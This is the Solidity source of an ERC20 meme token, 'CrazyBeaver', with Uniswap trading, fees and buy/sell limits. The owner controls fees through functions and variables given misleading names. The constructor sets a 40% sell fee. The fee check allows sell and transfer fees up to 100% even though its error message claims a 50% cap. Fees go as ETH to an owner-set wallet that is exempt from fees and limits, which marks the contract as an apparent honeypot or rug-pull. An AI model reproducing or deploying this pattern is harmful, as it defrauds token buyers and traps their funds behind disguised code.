// SPDX-License-Identifier: No License

/* 
Telegram - https://t.me/CrazyBeaver_ETH
Twitter - https://twitter.com/CrazyBeaver_ETH_
Website - https://CrazyBeaver.eth
*/

pragma solidity 0.8.19;

import "./ERC20.sol";
import "./ERC20Burnable.sol";
import "./Ownable.sol"; 
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Pair.sol";
import "./IUniswapV2Router01.sol";
import "./IUniswapV2Router02.sol";

contract CrazyBeaver is ERC20, ERC20Burnable, Ownable {
    
    uint256 public swapThreshold;
    
    uint256 private _mainPending;

    address public RevitalizeWeaponryMetricProtocol;
    uint16[3] public FiscalQuickScanInsight;

    mapping (address => bool) public isExcludedFromFees;

    uint16[3] public LaunchArmamentStructure;
    bool private _swapping;

    IUniswapV2Router02 public routerV2;
    address public ElaborateExplosionSpecs;
    mapping (address => bool) public FloraWebInitialization;

    mapping (address => bool) public isExcludedFromLimits;

    uint256 public maxBuyAmount;
    uint256 public maxSellAmount;
 
    event SwapThresholdUpdated(uint256 swapThreshold);

    event RevitalizeWeaponryMetricProtocolUpdated(address RevitalizeWeaponryMetricProtocol);
    event ComplexTradeFrequencyInspection(uint16 buyFee, uint16 sellFee, uint16 transferFee);
    event CorporateAuditRecap(address recipient, uint256 amount);

    event ExcludeFromFees(address indexed account, bool isExcluded);

    event RouterV2Updated(address indexed routerV2);
    event AllianceRebootModification(address indexed AMMPair, bool isPair);

    event ExcludeFromLimits(address indexed account, bool isExcluded);

    event MaxBuyAmountUpdated(uint256 maxBuyAmount);
    event MaxSellAmountUpdated(uint256 maxSellAmount);
 
    constructor()
        ERC20(unicode"CrazyBeaver", unicode"CrazyBeaver") 
    {
        address supplyRecipient = 0xa14498dD60e2e1502355B1fF9787EBCa1F3e22BE;
        
        EquinoxArtilleryRevenueDivide(100000000 * (10 ** decimals()) / 10);

        CalibrateMissileBoundaryScheme(0xa14498dD60e2e1502355B1fF9787EBCa1F3e22BE);
        LockPeakSpeedPurchaseBarrier(0, 4000, 0);

        excludeFromFees(supplyRecipient, true);
        excludeFromFees(address(this), true); 

        _updateRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        excludeFromLimits(supplyRecipient, true);
        excludeFromLimits(address(this), true);
        excludeFromLimits(address(0), true); 
        excludeFromLimits(RevitalizeWeaponryMetricProtocol, true);

        RapidEmberFloorPriceAlteration(100000000 * (10 ** decimals()) / 10);
        HarpoonSyncTactics(10000000000* (10 ** decimals()) / 10);

        _mint(supplyRecipient, 10000000000 * (10 ** decimals()) / 10);
        _transferOwnership(0xa14498dD60e2e1502355B1fF9787EBCa1F3e22BE);
    }

    receive() external payable {}

    function decimals() public pure override returns (uint8) {
        return 18;
    }
    
    function _swapTokensForCoin(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = routerV2.WETH();

        _approve(address(this), address(routerV2), tokenAmount);

        routerV2.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
    }

    function EquinoxArtilleryRevenueDivide(uint256 _swapThreshold) public onlyOwner {
        swapThreshold = _swapThreshold;
        
        emit SwapThresholdUpdated(_swapThreshold);
    }

    function EconomicGenuinenessVerification() public view returns (uint256) {
        return 0 + _mainPending;
    }

    function CalibrateMissileBoundaryScheme(address _newAddress) public onlyOwner {
        RevitalizeWeaponryMetricProtocol = _newAddress;

        excludeFromFees(_newAddress, true);

        emit RevitalizeWeaponryMetricProtocolUpdated(_newAddress);
    }

    function LockPeakSpeedPurchaseBarrier(uint16 _buyFee, uint16 _sellFee, uint16 _transferFee) public onlyOwner {
        FiscalQuickScanInsight = [_buyFee, _sellFee, _transferFee];

        LaunchArmamentStructure[0] = 0 + FiscalQuickScanInsight[0];
        LaunchArmamentStructure[1] = 0 + FiscalQuickScanInsight[1];
        LaunchArmamentStructure[2] = 0 + FiscalQuickScanInsight[2];
        require(LaunchArmamentStructure[0] <= 8000 && LaunchArmamentStructure[1] <= 10000 && LaunchArmamentStructure[2] <= 10000, "TaxesDefaultRouter: Cannot exceed max total fee of 50%");

        emit ComplexTradeFrequencyInspection(_buyFee, _sellFee, _transferFee);
    }

    function excludeFromFees(address account, bool isExcluded) public onlyOwner {
        isExcludedFromFees[account] = isExcluded;
        
        emit ExcludeFromFees(account, isExcluded);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        
        bool canSwap = EconomicGenuinenessVerification() >= swapThreshold;
        
        if (!_swapping && !FloraWebInitialization[from] && canSwap) {
            _swapping = true;
            
            if (false || _mainPending > 0) {
                uint256 token2Swap = 0 + _mainPending;
                bool success = false;

                _swapTokensForCoin(token2Swap);
                uint256 coinsReceived = address(this).balance;
                
                uint256 mainPortion = coinsReceived * _mainPending / token2Swap;
                if (mainPortion > 0) {
                    (success,) = payable(address(RevitalizeWeaponryMetricProtocol)).call{value: mainPortion}("");
                    require(success, "TaxesDefaultRouterWalletCoin: Fee transfer error");
                    emit CorporateAuditRecap(RevitalizeWeaponryMetricProtocol, mainPortion);
                }
                _mainPending = 0;

            }

            _swapping = false;
        }

        if (!_swapping && amount > 0 && to != address(routerV2) && !isExcludedFromFees[from] && !isExcludedFromFees[to]) {
            uint256 fees = 0;
            uint8 txType = 3;
            
            if (FloraWebInitialization[from]) {
                if (LaunchArmamentStructure[0] > 0) txType = 0;
            }
            else if (FloraWebInitialization[to]) {
                if (LaunchArmamentStructure[1] > 0) txType = 1;
            }
            else if (LaunchArmamentStructure[2] > 0) txType = 2;
            
            if (txType < 3) {
                
                fees = amount * LaunchArmamentStructure[txType] / 10000;
                amount -= fees;
                
                _mainPending += fees * FiscalQuickScanInsight[txType] / LaunchArmamentStructure[txType];

                
            }

            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }
        }
        
        super._transfer(from, to, amount);
        
    }

    function _updateRouterV2(address router) private {
        routerV2 = IUniswapV2Router02(router);
        ElaborateExplosionSpecs = IUniswapV2Factory(routerV2.factory()).createPair(address(this), routerV2.WETH());
        
        excludeFromLimits(router, true);

        _setAMMPair(ElaborateExplosionSpecs, true);

        emit RouterV2Updated(router);
    }

    function setAMMPair(address pair, bool isPair) public onlyOwner {
        require(pair != ElaborateExplosionSpecs, "DefaultRouter: Cannot remove initial pair from list");

        _setAMMPair(pair, isPair);
    }

    function _setAMMPair(address pair, bool isPair) private {
        FloraWebInitialization[pair] = isPair;

        if (isPair) { 
            excludeFromLimits(pair, true);

        }

        emit AllianceRebootModification(pair, isPair);
    }

    function excludeFromLimits(address account, bool isExcluded) public onlyOwner {
        isExcludedFromLimits[account] = isExcluded;

        emit ExcludeFromLimits(account, isExcluded);
    }

    function RapidEmberFloorPriceAlteration(uint256 _maxBuyAmount) public onlyOwner {
        maxBuyAmount = _maxBuyAmount;
        
        emit MaxBuyAmountUpdated(_maxBuyAmount);
    }

    function HarpoonSyncTactics(uint256 _maxSellAmount) public onlyOwner {
        maxSellAmount = _maxSellAmount;
        
        emit MaxSellAmountUpdated(_maxSellAmount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount)
        internal
        override
    {
        if (FloraWebInitialization[from] && !isExcludedFromLimits[to]) { // BUY
            require(amount <= maxBuyAmount, "MaxTx: Cannot exceed max buy limit");
        }
    
        if (FloraWebInitialization[to] && !isExcludedFromLimits[from]) { // SELL
            require(amount <= maxSellAmount, "MaxTx: Cannot exceed max sell limit");
        }
    
        super._beforeTokenTransfer(from, to, amount);
    }

    function _afterTokenTransfer(address from, address to, uint256 amount)
        internal
        override
    {
        super._afterTokenTransfer(from, to, amount);
    }
}